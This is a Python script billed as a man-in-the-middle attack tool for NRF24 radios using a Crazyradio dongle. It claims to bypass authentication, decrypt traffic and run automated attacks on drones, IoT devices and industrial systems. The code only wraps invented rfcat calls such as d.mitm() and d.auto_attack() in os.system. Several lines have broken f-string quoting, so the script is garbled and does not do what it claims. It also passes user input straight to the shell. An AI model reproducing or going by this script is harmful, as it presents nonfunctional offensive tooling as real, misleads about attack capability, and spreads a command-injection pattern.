import argparse
import os
import time
import json

# -------------------------------------------
# Crazyradio 2.0 NRF24 Man-in-the-Middle (MitM) Tool
# -------------------------------------------
# Features:
# - Intercepts NRF24 traffic in real-time
# - Modifies or replays packets to manipulate devices
# - Bypasses authentication mechanisms using spoofed responses
# - Targets drones, IoT devices, wireless controllers, and industrial systems
# - Logs all intercepted and modified packets
# - Auto-detects encrypted transmissions and attempts decryption
# - Supports automated attack sequences
#
# Requirements:
# - Crazyradio 2.0 USB Dongle
# - Python 3.x
# - RFCat & nrf-research-firmware (https://github.com/arcao/nrf-research-firmware)
#
# Usage:
# 1. Scan for active NRF24 devices:
#    python crazyradio_nrf24_mitm.py --scan
# 2. Intercept and log NRF24 traffic:
#    python crazyradio_nrf24_mitm.py --sniff --channel 76
# 3. Modify and replay intercepted packets:
#    python crazyradio_nrf24_mitm.py --modify --file captured_packets.txt
# 4. Perform a full MitM attack:
#    python crazyradio_nrf24_mitm.py --mitm --target XX:XX:XX:XX:XX:XX
# 5. Attempt decryption on captured encrypted packets:
#    python crazyradio_nrf24_mitm.py --decrypt --file intercepted_packets.txt
# 6. Execute an automated attack sequence:
#    python crazyradio_nrf24_mitm.py --auto-attack --target XX:XX:XX:XX:XX:XX
# -------------------------------------------

def scan_nrf24():
    """Scans for active NRF24-based devices."""
    print("[+] Scanning for NRF24 devices...")
    os.system("rfcat -r 'd.scan()' > nrf24_scan_results.txt")
    print("[✔] Scan complete. Results saved to nrf24_scan_results.txt")

def sniff_nrf24(channel):
    """Intercepts and logs NRF24 packets."""
    print(f"[+] Sniffing NRF24 traffic on channel {channel}...")
    os.system(f"rfcat -r 'd.sniff({channel})' > intercepted_packets.txt")
    print("[✔] Packets saved to intercepted_packets.txt")

def modify_packets(packet_file):
    """Modifies captured NRF24 packets before replaying them."""
    print(f"[+] Modifying packets from {packet_file}...")
    os.system(f"rfcat -r 'd.modify("{packet_file}")' > modified_packets.txt")
    print("[✔] Modified packets saved to modified_packets.txt")

def mitm_attack(target):
    """Performs a full Man-in-the-Middle attack by intercepting, modifying, and replaying packets."""
    print(f"[+] Starting MitM attack on {target}...")
    os.system(f"rfcat -r 'd.mitm("{target}")' > mitm_log.txt")
    print("[✔] MitM attack complete. Logs saved to mitm_log.txt")

def decrypt_packets(packet_file):
    """Attempts decryption on captured encrypted packets."""
    print(f"[+] Attempting to decrypt packets from {packet_file}...")
    os.system(f"rfcat -r 'd.decrypt("{packet_file}")' > decrypted_packets.txt")
    print("[✔] Decryption attempt complete. Results saved to decrypted_packets.txt")

def auto_attack(target):
    """Executes an automated attack sequence on a target device."""
    print(f"[+] Executing automated attack sequence on {target}...")
    os.system(f"rfcat -r 'd.auto_attack("{target}")' > attack_log.txt")
    print("[✔] Automated attack sequence complete. Logs saved to attack_log.txt")

def main():
    parser = argparse.ArgumentParser(description="Crazyradio 2.0 NRF24 Man-in-the-Middle (MitM) Tool")
    parser.add_argument("--scan", action='store_true', help="Scan for active NRF24 devices")
    parser.add_argument("--sniff", action='store_true', help="Intercept and log NRF24 traffic")
    parser.add_argument("--modify", action='store_true', help="Modify and replay captured packets")
    parser.add_argument("--mitm", action='store_true', help="Perform a full MitM attack")
    parser.add_argument("--decrypt", action='store_true', help="Attempt decryption of captured encrypted packets")
    parser.add_argument("--auto-attack", action='store_true', help="Execute an automated attack sequence")
    parser.add_argument("--channel", type=int, help="Channel to sniff NRF24 traffic on (default: 76)", default=76)
    parser.add_argument("--target", type=str, help="Target device MAC address for MitM attack")
    parser.add_argument("--file", type=str, help="File containing packets for modification/replay/decryption")
    args = parser.parse_args()

    if args.scan:
        scan_nrf24()
    elif args.sniff:
        sniff_nrf24(args.channel)
    elif args.modify and args.file:
        modify_packets(args.file)
    elif args.mitm and args.target:
        mitm_attack(args.target)
    elif args.decrypt and args.file:
        decrypt_packets(args.file)
    elif args.auto_attack and args.target:
        auto_attack(args.target)
    else:
        print("[!] No valid command provided. Use --help for options.")

if __name__ == "__main__":
    main()
